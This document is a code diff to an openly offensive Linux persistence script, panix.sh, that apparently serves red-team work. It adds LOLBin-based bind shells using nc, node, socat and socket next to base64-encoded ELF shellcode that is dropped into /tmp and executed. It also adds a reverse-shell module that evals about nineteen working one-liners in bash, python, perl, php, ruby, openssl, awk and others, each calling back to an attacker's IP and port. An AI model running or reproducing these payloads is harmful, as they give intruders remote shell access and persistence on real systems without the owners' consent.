@@ -27,10 +27,11 @@ usage_user() {
 	echo ""
 	echo "  --at                  At job persistence"
 	echo "  --authorized-keys     Add public key to authorized keys"
-	echo "  --bind-shell          Execute backgrounded bind shell"
+	echo "  --bind-shell          Execute backgrounded bind shell (supports multiple LOLBins)"
 	echo "  --cron                Cron job persistence"
 	echo "  --docker-container    Docker container with host escape (requires docker group permissions)"
 	echo "  --git                 Git persistence"
+	echo "  --reverse-shell       Reverse shell persistence (supports multiple LOLBins)"
 	echo "  --shell-profile       Shell profile persistence"
 	echo "  --ssh-key             SSH key persistence"
 	echo "  --systemd             Systemd service persistence"
@@ -46,7 +47,7 @@ usage_root() {
 	echo "  --at                  At job persistence"
 	echo "  --authorized-keys     Add public key to authorized keys"
 	echo "  --backdoor-user       Create backdoor user"
-	echo "  --bind-shell          Execute backgrounded bind shell"
+	echo "  --bind-shell          Execute backgrounded bind shell (supports multiple LOLBins)"
 	echo "  --cap                 Add capabilities persistence"
 	echo "  --create-user         Create a new user"
 	echo "  --cron                Cron job persistence"
@@ -62,6 +63,7 @@ usage_root() {
 	echo "  --passwd-user         Add user to /etc/passwd directly"
 	echo "  --password-change     Change user password"
 	echo "  --rc-local            Run Control (rc.local) persistence"
+	echo "  --reverse-shell       Reverse shell persistence (supports multiple LOLBins)"
 	echo "  --rootkit             Diamorphine (LKM) rootkit persistence"
 	echo "  --shell-profile       Shell profile persistence"
 	echo "  --ssh-key             SSH key persistence"
@@ -334,16 +336,26 @@ setup_backdoor_user() {
 setup_bind_shell() {
 	local default=0
 	local custom=0
+	local shellcode=0
+	local lolbin=0
 	local architecture=""
 	local binary=""
+	local nc=0
+	local node=0
+	local socat=0
+	local socket=0
 
 	usage_bind_shell() {
 		echo "Usage: ./panix.sh --bind-shell [OPTIONS]"
-		echo "--examples                   Display command examples"
-		echo "--default                    Use default bind shell settings"
-		echo "  --architecture <arch>        Specify architecture (x86 or x64)"
-		echo "--custom                     Use custom bind shell binary"
-		echo "  --binary <binary>            Specify the path to the custom binary"
+		echo "--examples                                Display command examples"
+		echo "--default                                 Use default bind shell settings"
+		echo "  --shellcode                               Use shellcode for bind shell"
+		echo "    --architecture <arch>                     Specify architecture (x86 or x64)"
+		echo "  --lolbin                                Use LOLBIN for bind shell"
+		echo "    --nc | --node | --socat | --socket      Specify LOLBIN to use"
+		echo "    --port <port>                             Specify port to bind shell to"
+		echo "--custom                                  Use custom bind shell binary"
+		echo "  --binary <binary>                         Specify the path to the custom binary"
 	}
 
 	while [[ "$1" != "" ]]; do
@@ -354,6 +366,12 @@ setup_bind_shell() {
 			--custom )
 				custom=1
 				;;
+			--shellcode )
+				shellcode=1
+				;;
+			--lolbin )
+				lolbin=1
+				;;
 			--architecture )
 				shift
 				architecture=$1
@@ -362,10 +380,27 @@ setup_bind_shell() {
 				shift
 				binary=$1
 				;;
+			--nc )
+				nc=1
+				;;
+			--node )
+				node=1
+				;;
+			--socat )
+				socat=1
+				;;
+			--socket )
+				socket=1
+				;;
+			--port )
+				shift
+				port=$1
+				;;
 			--examples )
 				echo "Examples:"
 				echo "--default:"
-				echo "sudo ./panix.sh --bind-shell --default --architecture x86"
+				echo "sudo ./panix.sh --bind-shell --default --shellcode --architecture x86"
+				echo "sudo ./panix.sh --bind-shell --default --lolbin --nc --port 1337"
 				echo ""
 				echo "--custom:"
 				echo "sudo ./panix.sh --bind-shell --custom --binary \"/tmp/bindshell\""
@@ -383,6 +418,7 @@ setup_bind_shell() {
 		shift
 	done
 
+	# Validate argument combinations
 	if [[ $default -eq 1 && $custom -eq 1 ]]; then
 		echo "Error: --default and --custom cannot be specified together."
 		echo "Try './panix.sh --bind-shell --help' for more information."
@@ -390,33 +426,142 @@ setup_bind_shell() {
 	fi
 
 	if [[ $default -eq 1 ]]; then
-		if [[ -z $architecture ]]; then
-			echo "Error: --architecture (x64/x86) must be specified when using --default."
+		if [[ $shellcode -eq 0 && $lolbin -eq 0 ]]; then
+			echo "Error: --default requires either --shellcode or --lolbin."
 			echo "Try './panix.sh --bind-shell --help' for more information."
 			exit 1
 		fi
 
-		case $architecture in
-			x86 )
-				echo -n "f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAiiAAAA8AAAAAcAAAAAEAAAMdv341NDU2oCieGwZs2AW15SaAIAIylqEFFQieFqZljNgIlBBLMEsGbNgEOwZs2Ak1lqP1jNgEl5+GgvL3NoaC9iaW6J41BTieGwC82A" | base64 -d > /tmp/bd86
-				chmod +x /tmp/bd86
-				/tmp/bd86 &
-				echo "[+] Bind shell binary /tmp/bd86 created and executed in the background."
-				;;
-			x64 )
-				echo -n "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAzgAAAAAAAAAkAQAAAAAAAAAQAAAAAAAAailYmWoCX2oBXg8FSJdSxwQkAgAjKUiJ5moQWmoxWA8FajJYDwVIMfZqK1gPBUiXagNeSP/OaiFYDwV19mo7WJlIuy9iaW4vc2gAU0iJ51JXSInmDwU=" | base64 -d > /tmp/bd64
-				chmod +x /tmp/bd64
-				/tmp/bd64 &
-				echo "[+] Bind shell binary /tmp/bd64 created and executed in the background."
-				;;
-			* )
-				echo "Error: Invalid architecture specified. Use one of x86 or x64"
+		if [[ $shellcode -eq 1 ]]; then
+			if [[ -z $architecture ]]; then
+				echo "Error: --architecture (x64/x86) must be specified when using --shellcode."
 				echo "Try './panix.sh --bind-shell --help' for more information."
 				exit 1
-		esac
+			fi
 
-		echo "[+] The bind shell is listening on port 9001."
-		echo "[+] To interact with it from a different system, use: nc -nv <IP> 9001"
+			case $architecture in
+				x86 )
+					echo "[+] Using shellcode for x86 architecture..."
+					echo -n "f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAiiAAAA8AAAAAcAAAAAEAAAMdv341NDU2oCieGwZs2AW15SaAIAIylqEFFQieFqZljNgIlBBLMEsGbNgEOwZs2Ak1lqP1jNgEl5+GgvL3NoaC9iaW6J41BTieGwC82A" | base64 -d > /tmp/bd86
+					chmod +x /tmp/bd86
+					/tmp/bd86 &
+					echo "[+] Bind shell binary /tmp/bd86 created and executed in the background."
+					;;
+				x64 )
+					echo "[+] Using shellcode for x64 architecture..."
+					echo -n "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAzgAAAAAAAAAkAQAAAAAAAAAQAAAAAAAAailYmWoCX2oBXg8FSJdSxwQkAgAjKUiJ5moQWmoxWA8FajJYDwVIMfZqK1gPBUiXagNeSP/OaiFYDwV19mo7WJlIuy9iaW4vc2gAU0iJ51JXSInmDwU=" | base64 -d > /tmp/bd64
+					chmod +x /tmp/bd64
+					/tmp/bd64 &
+					echo "[+] Bind shell binary /tmp/bd64 created and executed in the background."
+					;;
+				* )
+					echo "Error: Invalid architecture specified. Use one of x86 or x64."
+					echo "Try './panix.sh --bind-shell --help' for more information."
+					exit 1
+			esac
+			echo "[+] Bind shell persistence established!"
+			echo "[+] The bind shell is listening on port 9001."
+			echo "[+] To interact with it from a different system, use: nc -nv <IP> 9001"
+		fi
+
+		if [[ $lolbin -eq 1 ]]; then
+			if [[ $nc -eq 0 && $node -eq 0 && $socat -eq 0 && $socket -eq 0 ]]; then
+				echo "Error: --lolbin requires one of --nc, --node, --socat, or --socket."
+				echo "Try './panix.sh --bind-shell --help' for more information."
+				exit 1
+			fi
+
+			if [[ -z $port ]]; then
+				echo "Error: --port must be specified when using --lolbin."
+				echo "Try './panix.sh --bind-shell --help' for more information."
+				exit 1
+			fi
+
+			# Ref: https://gtfobins.github.io/gtfobins/nc/#bind-shell
+			if [[ $nc -eq 1 ]]; then
+				echo "[+] Checking for Netcat (nc.traditional) on the system..."
+				if command -v nc.traditional &>/dev/null; then
+					echo "[+] Netcat (nc.traditional) is available. Starting bind shell on port $port..."
+					nc.traditional -l -p "$port" -e /bin/sh &
+					echo "[+] Netcat bind shell running in the background on port $port."
+					echo "[+] To connect to the shell from the attacker box, use netcat or telnet:"
+					echo "    nc <target.com> $port"
+					echo "    telnet <target.com> $port"
+				elif command -v nc &>/dev/null; then
+					echo "[+] Checking if Netcat (nc) supports the -e option..."
+					if nc -h 2>&1 | grep -q -- "-e"; then
+						echo "[+] Netcat (nc) supports -e. Starting bind shell on port $port..."
+						nc -l -p "$port" -e /bin/sh &
+						echo "[+] Netcat bind shell running in the background on port $port."
+						echo "[+] To connect to the shell from the attacker box, use netcat or telnet:"
+						echo "    nc <target.com> $port"
+						echo "    telnet <target.com> $port"
+					else
+						echo "[-] Netcat (nc) does not support the -e option. Cannot use Netcat for bind shell."
+					fi
+				else
+					echo "[-] Neither nc.traditional nor nc with -e option is available. Cannot use Netcat for bind shell."
+				fi
+			fi
+
+			# https://gtfobins.github.io/gtfobins/node/#bind-shell
+			if [[ $node -eq 1 ]]; then
+				echo "[+] Checking for Node.js on the system..."
+				if command -v node &>/dev/null; then
+					echo "[+] Node.js is available. Starting bind shell on port $port..."
+
+					# Start the bind shell using Node.js
+					node -e "
+						const sh = require('child_process').spawn('/bin/sh');
+						require('net').createServer(client => {
+							client.pipe(sh.stdin);
+							sh.stdout.pipe(client);
+							sh.stderr.pipe(client);
+						}).listen($port);
+					" &
+
+					if [[ $? -eq 0 ]]; then
+						echo "[+] Node.js bind shell running in the background on port $port."
+						echo "[+] To connect to the shell from the attacker box, use netcat or telnet:"
+						echo "    nc <target.com> $port"
+						echo "    telnet <target.com> $port"
+					else
+						echo "[-] Failed to start Node.js bind shell."
+					fi
+				else
+					echo "[-] Node.js is not available on this system. Cannot use Node.js for bind shell."
+				fi
+			fi
+			
+			# Ref: https://gtfobins.github.io/gtfobins/socat/#bind-shell
+			if [[ $socat -eq 1 ]]; then
+				echo "[+] Checking for Socat on the system..."
+				if command -v socat &>/dev/null; then
+					echo "[+] Socat is available. Starting bind shell on port $port..."
+					socat TCP-LISTEN:$port,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane &
+					echo "[+] Socat bind shell running in the background on port $port."
+					echo "[+] To connect to the shell from the attacker box, run:"
+					echo "    socat FILE:\`tty\`,raw,echo=0 TCP:<target.com>:$port"
+				else
+					echo "[-] Socat is not available on this system. Cannot use Socat for bind shell."
+				fi
+			fi
+
+			# Ref: https://gtfobins.github.io/gtfobins/socket/#bind-shell
+			if [[ $socket -eq 1 ]]; then
+				echo "[+] Checking for Socket on the system..."
+				if command -v socket &>/dev/null; then
+					echo "[+] Socket is available. Starting bind shell on port $port..."
+					setsid nohup socket -svp '/bin/sh -i' $port &
+					echo "[+] Socket bind shell running in the background on port $port."
+					echo "[+] To connect to the shell from the attacker box, use netcat or telnet:"
+					echo "    nc <target.com> $port"
+					echo "    telnet <target.com> $port"
+				else
+					echo "[-] Socket is not available on this system. Cannot use Socket for bind shell."
+				fi
+			fi
+		fi
 
 	elif [[ $custom -eq 1 ]]; then
 		if [[ -z $binary ]]; then
@@ -426,7 +571,7 @@ setup_bind_shell() {
 		fi
 
 		if [[ ! -f $binary ]]; then
-			echo "Error: Specified binary does not exist: $binary"
+			echo "Error: Specified binary does not exist: $binary."
 			echo "Try './panix.sh --bind-shell --help' for more information."
 			exit 1
 		fi
@@ -434,13 +579,12 @@ setup_bind_shell() {
 		chmod +x $binary
 		$binary &
 		echo "[+] Custom binary $binary is executed and running in the background."
-
+		echo "[+] Bind shell persistence established!"
 	else
 		echo "Error: Either --default or --custom must be specified for --bind-shell."
 		echo "Try './panix.sh --bind-shell --help' for more information."
 		exit 1
 	fi
-	echo "[+] Bind shell persistence established!"
 }
 
 # Module: setup_cap_backdoor.sh
@@ -2656,6 +2800,321 @@ setup_rc_local_backdoor() {
 	echo "[+] rc.local backdoor persistence established!"
 }
 
+# Module: setup_reverse_shell.sh
+setup_reverse_shell() {
+    local ip=""
+    local port=""
+    local mechanism=""
+
+    usage_reverse_shell() {
+        echo "Usage: ./panix.sh --reverse-shell [OPTIONS]"
+        echo "--ip <ip>                       Specify the attacker's IP address"
+        echo "--port <port>                   Specify the port to connect to"
+        echo "--mechanism <mechanism>         Specify the reverse shell mechanism"
+        echo "--examples                      Display command examples"
+        echo ""
+        echo "Available mechanisms:"
+        echo "awk, bash, busybox, gawk, ksh, lua, nawk, nc, node, openssl, perl, php, pip, python, python3, ruby, sh-udp, socat, telnet"
+        echo ""
+    }
+
+    while [[ "$1" != "" ]]; do
+        case $1 in
+            --ip )
+                shift
+                ip=$1
+                ;;
+            --port )
+                shift
+                port=$1
+                ;;
+            --mechanism )
+                shift
+                mechanism=$1
+                ;;
+            --examples )
+                echo "Examples:"
+                echo "sudo ./panix.sh --reverse-shell --ip 10.10.10.10 --port 1337 --mechanism sh-udp"
+                exit 0
+                ;;
+            --help|-h)
+                usage_reverse_shell
+                exit 0
+                ;;
+            * )
+                echo "Invalid option for --reverse-shell: $1"
+                echo "Try './panix.sh --reverse-shell --help' for more information."
+                exit 1
+        esac
+        shift
+    done
+
+    # Validate arguments
+    if [[ -z $ip || -z $port || -z $mechanism ]]; then
+        echo "Error: --ip, --port, and --mechanism are required."
+        echo "Try './panix.sh --reverse-shell --help' for more information."
+        exit 1
+    fi
+
+    case $mechanism in
+    awk )
+        # Ref: https://gtfobins.github.io/gtfobins/awk/#non-interactive-reverse-shell
+        echo "[!] Checking for Awk..."
+        if command -v awk &>/dev/null; then
+            echo "[+] Awk is available. Checking compatibility with |& operator..."
+            # Test if `awk` supports the |& operator
+            if awk 'BEGIN {exit !("|&" in _ENV)}' 2>/dev/null; then
+                payload="awk -v RHOST=$ip -v RPORT=$port 'BEGIN {
+                    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;
+                    while (1) {
+                        printf \"> \" |& s;
+                        if ((s |& getline c) <= 0) break;
+                        while (c && (c |& getline) > 0) print \$0 |& s;
+                        close(c);
+                    }
+                }'"
+                echo "[+] Awk is compatible. Executing reverse shell on $ip:$port..."
+                eval "$payload &"
+            else
+                echo "[-] The installed Awk does not support the |& operator. Cannot use Awk for reverse shell."
+            fi
+        else
+            echo "[-] Awk is not available on this system. Cannot use Awk for reverse shell."
+        fi
+        ;;
+        bash )
+            # Ref: https://gtfobins.github.io/gtfobins/bash/#reverse-shell
+            echo "[!] Checking for Bash..."
+            if command -v bash &>/dev/null; then
+                payload="setsid nohup /bin/bash -i >& /dev/tcp/$ip/$port 0>&1"
+                echo "[+] Bash is available. Executing reverse shell on $ip:$port..."
+                eval "$payload &"
+            else
+                echo "[-] Bash is not available on this system. Cannot use Bash for reverse shell."
+            fi
+            ;;
+        busybox )
+            # Ref: https://gtfobins.github.io/gtfobins/busybox/#reverse-shell
+            echo "[!] Checking for Busybox..."
+            if command -v busybox &>/dev/null; then
+                payload="busybox nc $ip $port -e /bin/sh"
+                echo "[+] Busybox is available. Executing reverse shell on $ip:$port..."
+                eval "$payload &"
+            else
+                echo "[-] Busybox is not available on this system. Cannot use Busybox for reverse shell."
+            fi
+            ;;
+        gawk )
+            # Ref: https://gtfobins.github.io/gtfobins/awk/#non-interactive-reverse-shell
+            echo "[!] Checking for Gawk..."
+            if command -v gawk &>/dev/null; then
+                payload="gawk -v RHOST=$ip -v RPORT=$port 'BEGIN {
+                    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;
+                    while (1) {
+                        printf \"> \" |& s;
+                        if ((s |& getline c) <= 0) break;
+                        while (c && (c |& getline) > 0) print \$0 |& s;
+                        close(c);
+                    }
+                }'"
+                echo "[+] Gawk is available. Executing reverse shell on $ip:$port..."
+                eval "$payload &"
+            else
+                echo "[-] Gawk is not available on this system. Cannot use Gawk for reverse shell."
+            fi
+            ;;
+        ksh )
+            # Ref: https://gtfobins.github.io/gtfobins/ksh/#reverse-shell
+            echo "[!] Checking for Ksh..."
+            if command -v ksh &>/dev/null; then
+                payload="ksh -c 'ksh -i > /dev/tcp/$ip/$port 2>&1 0>&1'"
+                echo "[+] KornShell (KSH) is available. Executing reverse shell on $ip:$port..."
+                eval "$payload &"
+            else
+                echo "[-] KornShell (KSH) is not available on this system. Cannot use KSH for reverse shell."
+            fi
+            ;;
+        lua )
+            # Ref: https://gtfobins.github.io/gtfobins/lua/#non-interactive-reverse-shell
+            echo "[!] Checking for Lua..."
+            if command -v lua &>/dev/null; then
+                echo "[+] Lua is installed. Checking for LuaSocket..."
+                
+                if lua -e 'require("socket")' &>/dev/null; then
+                    payload="export RHOST=$ip; export RPORT=$port; lua -e 'local s=require(\"socket\"); local t=assert(s.tcp()); t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\")); while true do local r,x=t:receive();local f=assert(io.popen(r,\"r\")); local b=assert(f:read(\"*a\"));t:send(b); end; f:close();t:close();'"
+                    echo "[+] Lua & LuaSocket are available. Executing reverse shell on $ip:$port..."
+                    eval "$payload &"
+                else
+                    echo "[-] LuaSocket module is not installed. Cannot use Lua for reverse shell."
+                fi
+            else
+                echo "[-] Lua is not available on this system. Cannot use Lua for reverse shell."
+            fi
+            ;;
+        nawk )
+            # Ref: https://gtfobins.github.io/gtfobins/nawk/#non-interactive-reverse-shell
+            echo "[!] Checking for Nawk..."
+            if command -v nawk &>/dev/null; then
+                payload="nawk -v RHOST=$ip -v RPORT=$port 'BEGIN {
+                    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;
+                    while (1) {
+                        printf \"> \" |& s;
+                        if ((s |& getline c) <= 0) break;
+                        while (c && (c |& getline) > 0) print \$0 |& s;
+                        close(c);
+                    }
+                }'"
+                echo "[+] Nawk is available. Executing reverse shell on $ip:$port..."
+                eval "$payload &"
+            else
+                echo "[-] nawk is not available on this system. Cannot use Nawk for reverse shell."
+            fi
+            ;;
+        nc )
+            # Ref: https://gtfobins.github.io/gtfobins/nc/#reverse-shell
+            echo "[!] Checking for Netcat (nc.traditional)..."
+            if command -v nc.traditional &>/dev/null; then
+                payload="nc.traditional -e /bin/sh $ip $port"
+                echo "[+] nc.traditional is available. Executing reverse shell on $ip:$port..."
+                eval "$payload &"
+            else
+                echo "[-] nc.traditional is not available on this system. Cannot use nc.traditional for reverse shell."
+            fi
+            ;;
+        node )
+            # Ref: https://gtfobins.github.io/gtfobins/node/#reverse-shell
+            echo "[!] Checking for Node.js..."
+            if command -v node &>/dev/null; then
+                echo "[+] Node.js is available. Executing reverse shell on $ip:$port..."
+                payload="export RHOST=$ip; export RPORT=$port; node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\"); require(\"net\").connect(process.env.RPORT, process.env.RHOST, function () { this.pipe(sh.stdin); sh.stdout.pipe(this); sh.stderr.pipe(this); })'"
+                eval "$payload &"
+            else
+                echo "[-] Node.js is not available on this system. Cannot use Node.js for reverse shell."
+            fi
+            ;;
+        openssl )
+            # Ref: https://gtfobins.github.io/gtfobins/openssl/#reverse-shell
+            echo "[!] Checking for OpenSSL..."
+            if command -v openssl &>/dev/null; then
+                echo "[+] OpenSSL is available. Executing reverse shell on $ip:$port..."
+
+                echo ""
+                echo "Make sure you have a correct listener up and running on the target host"
+                echo "Use the following commands to set it up if you haven't already:"
+                echo "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes"
+                echo "openssl s_server -quiet -key key.pem -cert cert.pem -port $port"
+                echo ""
+
+                payload="RHOST=$ip; RPORT=$port; mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect \$RHOST:\$RPORT > /tmp/s; rm /tmp/s"
+                eval "$payload &"
+            else
+                echo "[-] OpenSSL is not available on this system. Cannot use OpenSSL for reverse shell."
+            fi
+            ;;
+        perl )
+            # Ref: https://gtfobins.github.io/gtfobins/perl/#reverse-shell
+            echo "[!] Checking for Perl..."
+            if command -v perl &>/dev/null; then
+                echo "[+] Perl is available. Executing reverse shell on $ip:$port..."
+                payload="export RHOST=$ip; export RPORT=$port; setsid nohup perl -e 'use Socket;\$i=\"\$ENV{RHOST}\";\$p=\$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+                eval "$payload &"
+            else
+                echo "[-] Perl is not available on this system. Cannot use Perl for reverse shell."
+            fi
+            ;;
+        php )
+            # Ref: https://gtfobins.github.io/gtfobins/php/#reverse-shell
+            echo "[!] Checking for PHP..."
+            if command -v php &>/dev/null; then
+                echo "[+] PHP is available. Executing reverse shell on $ip:$port..."
+                payload="export RHOST=$ip; export RPORT=$port; setsid nohup php -r '\$sock=fsockopen(getenv(\"RHOST\"),getenv(\"RPORT\"));exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+                eval "$payload &"
+            else
+                echo "[-] PHP is not available on this system. Cannot use PHP for reverse shell."
+                payload=""
+            fi
+            ;;
+        python )
+            # Ref: https://gtfobins.github.io/gtfobins/python/#reverse-shell
+            echo "[!] Checking for Python..."
+            if command -v python &>/dev/null; then
+                echo "[+] Python is available. Executing reverse shell on $ip:$port..."
+                payload="nohup setsid python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+                eval "$payload &"
+            else
+                echo "[-] Python is not available on this system. Cannot use Python for reverse shell."
+            fi
+            ;;
+        python3 )
+            # Ref: https://gtfobins.github.io/gtfobins/python/#reverse-shell
+            echo "[!] Checking for Python3..."
+            if command -v python3 &>/dev/null; then
+                echo "[+] Python3 is available. Executing reverse shell on $ip:$port..."
+                payload="nohup setsid python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+                eval "$payload &"
+            else
+                echo "[-] Python3 is not available on this system. Cannot use Python3 for reverse shell."
+            fi
+            ;;
+        ruby )
+            # Ref: https://gtfobins.github.io/gtfobins/ruby/#reverse-shell
+            echo "[!] Checking for Ruby..."
+            if command -v ruby &>/dev/null; then
+                echo "[+] Ruby is available. Executing reverse shell on $ip:$port..."
+                payload="export RHOST=$ip; export RPORT=$port; nohup setsid ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"]);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
+                eval "$payload &"
+            else
+                echo "[-] Ruby is not available on this system. Cannot use Ruby for reverse shell."
+            fi
+            ;;
+        sh-udp )
+            # Ref: https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#tools
+            echo "[!] Checking for Sh..."
+            if command -v sh &>/dev/null; then
+                echo "[+] Sh found. Executing reverse shell on $ip:$port..."
+                payload="setsid nohup sh -i >& /dev/udp/$ip/$port 0>&1"
+                eval "$payload &"
+            else
+                echo "[-] Sh is not available on this system. Cannot use Sh for reverse shell."
+            fi
+            ;;
+        socat )
+            # Ref: https://gtfobins.github.io/gtfobins/socat/#reverse-shell
+            echo "[!] Checking for Socat..."
+            if command -v socat &>/dev/null; then
+                echo "[+] Socat is available. Executing reverse shell to $ip:$port..."
+
+                echo ""
+                echo "Make sure you have a correct listener up and running on the target host"
+                echo "Use the following commands to set it up if you haven't already:"
+                echo "socat FILE:`tty`,raw,echo=0 TCP:$ip:$port"
+                echo ""
+
+                payload="RHOST=$ip; RPORT=$port; socat tcp-connect:\$RHOST:\$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane"
+                eval "$payload &"
+            else
+                echo "[-] Socat is not available on this system. Cannot use Socat for reverse shell."
+            fi
+            ;;
+        telnet )
+            # Ref: https://gtfobins.github.io/gtfobins/telnet/#reverse-shell
+            echo "[!] Checking for Telnet..."
+            if command -v telnet &>/dev/null; then
+                echo "[+] Telnet is available. Executing reverse shell to $ip:$port..."
+                payload="RHOST=$ip; RPORT=$port; TF=\$(mktemp -u); mkfifo \$TF && telnet \$RHOST \$RPORT 0<\$TF | /bin/sh 1>\$TF"
+                eval "$payload &"
+            else
+                echo "[-] Telnet is not available on this system. Cannot use Telnet for reverse shell."
+            fi
+            ;;
+        *)
+            echo "Error: Unsupported mechanism: $mechanism"
+            echo "Try './panix.sh --reverse-shell --help' for more information."
+            exit 1
+            ;;
+    esac
+}
+
 # Module: setup_rootkit.sh
 setup_rootkit() {
     # References:
@@ -4327,6 +4786,11 @@ main() {
 			--rc-local )
 				shift
 				setup_rc_local_backdoor "$@"
+				exit
+				;;
+			--reverse-shell )
+				shift
+				setup_reverse_shell "$@"
 				exit
 				;;
 			--rootkit )
